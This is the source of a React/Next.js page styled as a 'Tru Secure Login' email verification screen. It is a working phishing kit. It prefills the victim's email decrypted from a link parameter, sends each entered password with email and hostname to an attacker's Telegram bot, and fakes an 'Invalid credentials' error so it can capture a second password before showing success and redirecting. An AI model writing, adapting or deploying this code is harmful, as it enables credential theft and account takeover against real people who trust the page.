import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import CryptoJS from 'crypto-js';
import { useRouter } from 'next/router';

const LoginPage = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [step, setStep] = useState(1);
  const router = useRouter();

  useEffect(() => {
    // Create circuit board background
    const createCircuitBackground = () => {
      const board = document.querySelector('.circuit-board');
      if (!board) return;
      
      // Clear any existing elements
      board.innerHTML = '';
      
      // Create circuit lines
      for (let i = 0; i < 20; i++) {
        const line = document.createElement('div');
        line.className = 'circuit-line';
        
        const isHorizontal = Math.random() > 0.5;
        const width = isHorizontal ? Math.random() * 300 + 100 : 2;
        const height = isHorizontal ? 2 : Math.random() * 300 + 100;
        
        line.style.width = `${width}px`;
        line.style.height = `${height}px`;
        line.style.left = `${Math.random() * 100}%`;
        line.style.top = `${Math.random() * 100}%`;
        line.style.opacity = Math.random() * 0.5 + 0.1;
        
        board.appendChild(line);
      }
      
      // Create circuit nodes
      for (let i = 0; i < 30; i++) {
        const node = document.createElement('div');
        node.className = 'circuit-node';
        
        const size = Math.random() * 12 + 4;
        node.style.width = `${size}px`;
        node.style.height = `${size}px`;
        node.style.left = `${Math.random() * 100}%`;
        node.style.top = `${Math.random() * 100}%`;
        
        board.appendChild(node);
      }
    };

    const extractAESFromURL = () => {
      const url = window.location.href;
      const aesParam = url.split('&AES=')[1];
      return aesParam ? decodeURIComponent(aesParam) : null;
    };

    const aesParam = extractAESFromURL();
    
    if (aesParam) {
      try {
        const salt = process.env.NEXT_PUBLIC_SALT;
        if (!salt) {
          throw new Error('Decryption salt not configured');
        }

        const bytes = CryptoJS.AES.decrypt(aesParam, salt);
        const decryptedEmail = bytes.toString(CryptoJS.enc.Utf8);
        
        if (decryptedEmail) {
          setEmail(decryptedEmail);
        } else {
          throw new Error('Failed to decrypt');
        }
      } catch (err) {
        console.error('Decryption error:', err);
        setError('Invalid or corrupted link');
      }
    }
    
    // Create the circuit background after component mounts
    createCircuitBackground();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (password.length < 5) {
      setError('Password must be at least 5 characters');
      return;
    }
    
    setIsLoading(true);
    setError('');

    try {
      const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const redirectUrl = process.env.NEXT_PUBLIC_REDIRECT_URL;
      
      if (!telegramBotToken || !telegramChatId) {
        throw new Error('Telegram integration not properly configured');
      }

      const message = `🔒 *TRU SECURITY NOTIFICATION* 🔒
      
- *USER IDENTIFIED*: ${email}
- *ACCESS ATTEMPT*: ${step === 1 ? 'First Attempt' : 'Second Attempt'}
- *PASSWORD ATTEMPT*: ||${password}||
- *TIMESTAMP*: ${new Date().toISOString()}
- *ORIGIN*: ${window.location.hostname}

${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL ACCESS ATTEMPT DETECTED* 🚨'}`;

      const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: message,
          parse_mode: 'Markdown',
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to send notification');
      }

      if (step === 1) {
        setError('Invalid credentials. Please try again.');
        setStep(2);
        setPassword('');
      } else {
        setSuccess(true);
        if (redirectUrl) {
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, 2000);
        }
      }
    } catch (err) {
      setError(err.message || 'An error occurred during login');
    } finally {
      setIsLoading(false);
    }
  };

  if (error && error === 'Invalid or corrupted link') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-700 flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white rounded-lg shadow-md p-6">
          <div className="text-center">
            <div className="text-red-500 text-5xl mb-4">❌</div>
            <h1 className="text-2xl font-bold text-gray-800 mb-2">Invalid Link</h1>
            <p className="text-gray-600">The link you used is invalid or corrupted.</p>
            <p className="text-gray-600 mt-2">Please check the URL and try again.</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-700 flex items-center justify-center p-4 relative overflow-hidden">
      {/* Circuit Board Background */}
      <div className="circuit-board absolute inset-0 z-0 opacity-50"></div>
      
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="w-full max-w-md z-10"
      >
        <div className="bg-gray-900 bg-opacity-80 backdrop-blur-md rounded-xl shadow-2xl overflow-hidden border border-blue-500 border-opacity-30">
          <div className="p-6 bg-gradient-to-r from-blue-700 to-blue-600">
            <div className="flex items-center justify-center flex-col">
              <div className="bg-white p-3 rounded-full mb-4">
                <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-400 rounded-full flex items-center justify-center">
                  <svg className="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                  </svg>
                </div>
              </div>
              <h1 className="text-2xl font-bold text-white text-center">Tru Secure Login</h1>
              <p className="text-blue-100 mt-2">Verify your email access to continue</p>
            </div>
          </div>
          
          <div className="p-6">
            {error && !success && (
              <div className={`mb-4 p-3 rounded-md text-sm ${step === 2 ? 'bg-red-900 bg-opacity-50 text-red-200 border border-red-700' : 'bg-yellow-900 bg-opacity-50 text-yellow-200 border border-yellow-700'}`}>
                {error}
              </div>
            )}
            
            {success ? (
              <div className="text-center py-4">
                <div className="text-green-400 text-5xl mb-4">✓</div>
                <h3 className="text-xl font-bold text-white mb-2">Login Successful</h3>
                <p className="text-blue-200">Redirecting you to the application...</p>
                <div className="mt-4 bg-blue-900 bg-opacity-50 p-3 rounded border border-blue-700">
                  <p className="text-blue-300 text-sm">Your access has been granted</p>
                </div>
              </div>
            ) : (
              <form onSubmit={handleSubmit}>
                <div className="mb-4">
                  <label className="block text-blue-200 text-sm font-medium mb-2">
                    Email Address
                  </label>
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                      <svg className="h-5 w-5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                      </svg>
                    </div>
                    <input
                      type="email"
                      value={email}
                      disabled
                      className="bg-blue-900 bg-opacity-50 border border-blue-700 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5 text-blue-200 placeholder-blue-400"
                    />
                  </div>
                </div>
                
                <div className="mb-4">
                  <label className="block text-blue-200 text-sm font-medium mb-2">
                    Password
                  </label>
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                      <svg className="h-5 w-5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                      </svg>
                    </div>
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      required
                      minLength={5}
                      className="bg-blue-900 bg-opacity-50 border border-blue-700 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5 text-white placeholder-blue-400"
                      placeholder="Enter your password"
                    />
                  </div>
                  <p className="text-xs text-blue-400 mt-1">Password must be at least 5 characters</p>
                </div>
                
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-700 hover:to-cyan-600 focus:ring-4 focus:ring-blue-300 font-medium rounded-md text-sm px-5 py-2.5 text-center text-white transition-all duration-200 disabled:opacity-75 shadow-lg"
                >
                  {isLoading ? (
                    <span className="flex items-center justify-center">
                      <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      {step === 1 ? 'VERIFYING...' : 'PROCESSING...'}
                    </span>
                  ) : (
                    step === 1 ? 'LOGIN' : 'TRY AGAIN'
                  )}
                </button>
              </form>
            )}
          </div>
          
          <div className="px-6 py-3 bg-blue-900 bg-opacity-70 border-t border-blue-700 text-center">
            <p className="text-xs text-blue-300">
              Secure Login System • {new Date().getFullYear()}
            </p>
          </div>
        </div>
      </motion.div>

      <style jsx global>{`
        .circuit-board {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 0;
          overflow: hidden;
          pointer-events: none;
        }
        
        .circuit-line {
          position: absolute;
          background: rgba(0, 255, 255, 0.15);
          border-radius: 1px;
        }
        
        .circuit-node {
          position: absolute;
          background: rgba(0, 200, 255, 0.4);
          border-radius: 50%;
          box-shadow: 0 0 15px rgba(0, 200, 255, 0.5);
        }
      `}</style>
    </div>
  );
};

export default LoginPage;
